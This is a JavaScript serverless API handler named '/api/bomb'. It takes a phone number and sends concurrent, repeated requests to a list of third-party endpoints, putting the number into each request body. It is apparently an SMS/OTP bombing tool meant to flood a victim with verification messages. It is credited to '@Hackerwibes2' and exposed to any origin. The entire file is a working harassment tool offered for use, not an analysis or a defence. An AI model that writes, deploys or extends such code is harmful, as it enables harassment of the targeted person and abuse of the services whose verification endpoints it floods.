const ENDPOINTS = require('../lib/endpoints');

const POOL_SIZE = 30;        // parallel workers
const TIMEOUT = 7000;        // per request

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    let phone = req.query.phone || req.query.number || req.query.mobile;
    if (req.method === 'POST' && req.body) {
        phone = req.body.phone || req.body.number || req.body.mobile || phone;
    }
    if (!phone) {
        return res.status(400).json({
            status: false,
            error: 'phone required',
            usage: '/api/bomb?phone=9876543210&filter=all&loops=1'
        });
    }

    const clean = String(phone).replace(/\D/g, '');
    if (clean.length < 10 || clean.length > 15) {
        return res.status(400).json({ status: false, error: 'invalid phone' });
    }

    const filter = (req.query.filter || req.body?.filter || 'all').toLowerCase();
    const loops = Math.min(Math.max(parseInt(req.query.loops || req.body?.loops || 1), 1), 20);

    let list = ENDPOINTS;
    if (filter !== 'all') list = list.filter(e => e.c === filter);
    if (list.length === 0) {
        return res.status(400).json({ status: false, error: 'no endpoints for filter: ' + filter });
    }

    // Build tasks
    const tasks = [];
    for (let i = 0; i < loops; i++) {
        for (const ep of list) tasks.push(ep);
    }

    const t0 = Date.now();
    const stats = { total: tasks.length, ok: 0, fail: 0, err: 0 };
    const details = [];

    // Concurrency pool
    let idx = 0;
    const worker = async () => {
        while (true) {
            const myIdx = idx++;
            if (myIdx >= tasks.length) return;
            const ep = tasks[myIdx];
            const r = await fire(ep, clean);
            if (r.ok) stats.ok++;
            else if (r.err) stats.err++;
            else stats.fail++;
            if (details.length < 200) details.push(r);
        }
    };

    const workers = [];
    const n = Math.min(POOL_SIZE, tasks.length);
    for (let i = 0; i < n; i++) workers.push(worker());
    await Promise.all(workers);

    res.status(200).json({
        status: true,
        target: clean,
        filter,
        loops,
        endpoints: list.length,
        elapsed_ms: Date.now() - t0,
        stats,
        details,
        developer: '@Hackerwibes2'
    });
};

async function fire(ep, phone) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), TIMEOUT);

    try {
        const url = ep.u;
        const method = (ep.m || 'GET').toUpperCase();
        const headers = { ...(ep.h || {}) };
        let body = ep.b;

        if (body) {
            body = body.replace(/\{p\}/g, phone)
                       .replace(/\{ts\}/g, Date.now())
                       .replace(/\{uuid\}/g, rand(16))
                       .replace(/\{random_id\}/g, rand(6))
                       .replace(/\{random_md5\}/g, rand(32));
        }

        const opts = {
            method,
            headers,
            signal: controller.signal
        };
        if (method !== 'GET' && method !== 'HEAD' && body) {
            opts.body = body;
        }

        const r = await fetch(url, opts);
        clearTimeout(timer);

        let preview = '';
        try {
            preview = (await r.text()).substring(0, 120);
        } catch (_) {}

        return {
            name: ep.n,
            status: r.status,
            ok: r.status >= 200 && r.status < 300,
            preview
        };
    } catch (e) {
        clearTimeout(timer);
        return {
            name: ep.n,
            status: 0,
            ok: false,
            err: true,
            error: e.name === 'AbortError' ? 'timeout' : (e.message || '').substring(0, 80)
        };
    }
}

function rand(n) {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < n; i++) s += c[Math.floor(Math.random() * c.length)];
    return s;
}
